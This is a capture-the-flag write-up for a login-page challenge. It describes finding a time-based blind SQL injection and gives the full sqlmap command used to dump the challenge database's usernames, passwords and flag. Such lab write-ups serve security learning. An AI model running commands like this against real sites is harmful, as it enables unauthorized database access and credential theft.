* As usual, there is a login page: https://chall2.hackingbrawl.com/newlogin.php (This challenge was the next in the sequel to the basic sqli one)

* At first few SQL injection methods were attempted, but these went in vain. Upon using sqlmap, it was discovered that it was vulnerable `time-based-blind` injection. So manual attempts were done, the site seemed to slow down a bit when the payload was injected. 

* The `data` value required for sqlmap was found upon doing a POST request. This value was: `enroll=a&passes=`

* the lower levels did not work, so the level was increased and tested.

* `hack_chall2` was the database, `TAB` was the table, with `PASSWORD` and `USERNAME` as field(s).

```bash
python3 sqlmap.py --url https://chall2.hackingbrawl.com/newlogin.php --technique=T --random-agent --data='enroll=a&passes=' --level=5 -D hack_chall2 --dump --no-cast
```

* The flag was in one of the rows of the table: `CTF{INJECTKAFLAG}`


![image](https://user-images.githubusercontent.com/43957261/125963329-f5b1d70d-ee8f-467e-a72b-c0ea361aeaa3.png)

![image](https://user-images.githubusercontent.com/43957261/125963577-14dd5f56-3b2b-4f94-bc28-7aefed537957.png)
